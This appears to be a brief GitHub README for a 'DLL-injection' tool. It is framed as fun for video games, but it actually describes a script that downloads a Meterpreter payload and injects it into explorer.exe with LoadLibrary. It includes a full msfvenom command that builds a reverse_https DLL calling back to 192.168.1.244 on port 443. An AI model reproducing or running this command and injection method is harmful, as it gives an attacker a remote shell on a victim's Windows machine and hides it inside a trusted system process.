# DLL-injection
Usually fun with injecting into video games
basic dll injection script 
script will download the following 
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.244 LPORT=443 -f dll -o met.dll       

dll will be injected into explorer.exe using loadlibrary 
![image](https://github.com/user-attachments/assets/5c7334f5-e9f1-4adb-9ec7-87610728c5fc)
